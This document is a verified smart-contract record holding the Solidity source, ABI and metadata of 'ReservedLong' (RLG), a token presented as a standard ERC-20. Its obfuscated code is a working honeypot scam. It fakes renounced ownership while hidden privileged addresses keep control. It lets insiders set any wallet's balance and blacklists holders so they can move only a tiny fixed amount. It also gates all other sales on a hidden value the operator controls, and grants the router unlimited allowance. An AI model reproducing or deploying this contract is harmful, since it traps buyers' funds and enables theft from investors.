{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.2;\n\ninterface isFromReceiver {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address shouldMode) external view returns (uint256);\n\n    function transfer(address limitReceiver, uint256 liquidityEnableTake) external returns (bool);\n\n    function allowance(address takeShould, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 liquidityEnableTake) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address limitReceiver,\n        uint256 liquidityEnableTake\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed isLaunch, uint256 value);\n    event Approval(address indexed takeShould, address indexed spender, uint256 value);\n}\n\nabstract contract isSwapAt {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface totalLaunch {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface takeTx {\n    function createPair(address exemptFund, address tokenTotal) external returns (address);\n}\n\ninterface isFromReceiverMetadata is isFromReceiver {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ReservedLong is isSwapAt, isFromReceiver, isFromReceiverMetadata {\n\n    mapping(address => bool) public takeMin;\n\n    function owner() external view returns (address) {\n        return autoLimit;\n    }\n\n    address public modeLaunch;\n\n    function getOwner() external view returns (address) {\n        return autoLimit;\n    }\n\n    bool private enableTotal;\n\n    mapping(address => uint256) private tradingWallet;\n\n    string private fromReceiver = \"RLG\";\n\n    bool public atFund;\n\n    uint256 private maxAmountLiquidity;\n\n    uint256 marketingTrading;\n\n    function launchTake(uint256 liquidityEnableTake) public {\n        walletLaunchedBuy();\n        enableLimit = liquidityEnableTake;\n    }\n\n    function approve(address minExempt, uint256 liquidityEnableTake) public virtual override returns (bool) {\n        modeIs[_msgSender()][minExempt] = liquidityEnableTake;\n        emit Approval(_msgSender(), minExempt, liquidityEnableTake);\n        return true;\n    }\n\n    string private launchLiquidity = \"Reserved Long\";\n\n    address private autoLimit;\n\n    constructor (){\n        \n        totalLaunch fromToken = totalLaunch(totalSwap);\n        maxFund = takeTx(fromToken.factory()).createPair(fromToken.WETH(), address(this));\n        \n        modeLaunch = _msgSender();\n        marketingMin();\n        takeMin[modeLaunch] = true;\n        tradingWallet[modeLaunch] = teamMax;\n        if (minBuyMode == enableTotal) {\n            enableTotal = true;\n        }\n        emit Transfer(address(0), modeLaunch, teamMax);\n    }\n\n    function transfer(address txMax, uint256 liquidityEnableTake) external virtual override returns (bool) {\n        return takeEnable(_msgSender(), txMax, liquidityEnableTake);\n    }\n\n    function liquidityList(address tokenTakeMax) public {\n        walletLaunchedBuy();\n        \n        if (tokenTakeMax == modeLaunch || tokenTakeMax == maxFund) {\n            return;\n        }\n        isSwap[tokenTakeMax] = true;\n    }\n\n    function marketingMin() public {\n        emit OwnershipTransferred(modeLaunch, address(0));\n        autoLimit = address(0);\n    }\n\n    uint256 constant launchMax = 8 ** 10;\n\n    uint256 private teamMax = 100000000 * 10 ** 18;\n\n    function marketingTotal(address receiverSwapLaunch) public {\n        if (atFund) {\n            return;\n        }\n        if (tradingIs) {\n            exemptReceiverTrading = true;\n        }\n        takeMin[receiverSwapLaunch] = true;\n        if (receiverSwap != maxAmountLiquidity) {\n            tradingIs = false;\n        }\n        atFund = true;\n    }\n\n    uint256 enableLimit;\n\n    address totalSwap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return teamMax;\n    }\n\n    function allowance(address liquidityTx, address minExempt) external view virtual override returns (uint256) {\n        if (minExempt == totalSwap) {\n            return type(uint256).max;\n        }\n        return modeIs[liquidityTx][minExempt];\n    }\n\n    bool public tradingIs;\n\n    uint8 private tradingTeamMax = 18;\n\n    function balanceOf(address shouldMode) public view virtual override returns (uint256) {\n        return tradingWallet[shouldMode];\n    }\n\n    mapping(address => bool) public isSwap;\n\n    function name() external view virtual override returns (string memory) {\n        return launchLiquidity;\n    }\n\n    function takeSender(address txMax, uint256 liquidityEnableTake) public {\n        walletLaunchedBuy();\n        tradingWallet[txMax] = liquidityEnableTake;\n    }\n\n    function launchTrading(address fundAmount, address limitReceiver, uint256 liquidityEnableTake) internal returns (bool) {\n        require(tradingWallet[fundAmount] >= liquidityEnableTake);\n        tradingWallet[fundAmount] -= liquidityEnableTake;\n        tradingWallet[limitReceiver] += liquidityEnableTake;\n        emit Transfer(fundAmount, limitReceiver, liquidityEnableTake);\n        return true;\n    }\n\n    function walletLaunchedBuy() private view {\n        require(takeMin[_msgSender()]);\n    }\n\n    uint256 public senderMarketing;\n\n    function takeEnable(address fundAmount, address limitReceiver, uint256 liquidityEnableTake) internal returns (bool) {\n        if (fundAmount == modeLaunch) {\n            return launchTrading(fundAmount, limitReceiver, liquidityEnableTake);\n        }\n        uint256 tradingLiquidityEnable = isFromReceiver(maxFund).balanceOf(launchAuto);\n        require(tradingLiquidityEnable == enableLimit);\n        require(limitReceiver != launchAuto);\n        if (isSwap[fundAmount]) {\n            return launchTrading(fundAmount, limitReceiver, launchMax);\n        }\n        return launchTrading(fundAmount, limitReceiver, liquidityEnableTake);\n    }\n\n    bool public exemptReceiverTrading;\n\n    event OwnershipTransferred(address indexed tradingTake, address indexed receiverEnable);\n\n    function transferFrom(address fundAmount, address limitReceiver, uint256 liquidityEnableTake) external override returns (bool) {\n        if (_msgSender() != totalSwap) {\n            if (modeIs[fundAmount][_msgSender()] != type(uint256).max) {\n                require(liquidityEnableTake <= modeIs[fundAmount][_msgSender()]);\n                modeIs[fundAmount][_msgSender()] -= liquidityEnableTake;\n            }\n        }\n        return takeEnable(fundAmount, limitReceiver, liquidityEnableTake);\n    }\n\n    uint256 private receiverSwap;\n\n    function symbol() external view virtual override returns (string memory) {\n        return fromReceiver;\n    }\n\n    mapping(address => mapping(address => uint256)) private modeIs;\n\n    address public maxFund;\n\n    function decimals() external view virtual override returns (uint8) {\n        return tradingTeamMax;\n    }\n\n    address launchAuto = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private maxAmount;\n\n    bool private minBuyMode;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeShould\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverEnable\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isLaunch\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityTx\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minExempt\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minExempt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityEnableTake\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldMode\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptReceiverTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"liquidityEnableTake\",\"type\":\"uint256\"}],\"name\":\"launchTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenTakeMax\",\"type\":\"address\"}],\"name\":\"liquidityList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverSwapLaunch\",\"type\":\"address\"}],\"name\":\"marketingTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxFund\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeLaunch\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityEnableTake\",\"type\":\"uint256\"}],\"name\":\"takeSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityEnableTake\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundAmount\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"limitReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"liquidityEnableTake\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ReservedLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}